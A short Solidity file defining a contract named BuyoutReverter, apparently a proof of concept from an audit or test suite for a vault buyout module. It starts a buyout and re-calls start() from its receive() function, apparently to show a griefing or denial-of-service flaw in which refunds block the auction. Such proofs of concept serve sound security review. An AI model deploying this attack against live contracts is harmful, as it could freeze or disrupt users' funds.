// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.13;

import "../src/interfaces/IBuyout.sol";
import "../src/interfaces/IVault.sol";

contract BuyoutReverter {

  IVault vault;
  IBuyout buyoutModule;

  constructor(address _vault, address _buyoutModule) {
    vault = IVault(_vault);
    buyoutModule = IBuyout(_buyoutModule);

  }

  function attack() external payable {
    buyoutModule.start{value: msg.value}(address(vault));
  }

  function onERC1155Received(
     address /*operator*/,
     address /*from*/,
     uint256 /*id*/,
     uint256 /*value*/,
     bytes calldata /*data*/) external pure returns (bytes4) {
    return bytes4(0xf23a6e61);
  }

  receive() payable external {
    buyoutModule.start{value: msg.value}(address(vault));

  }

}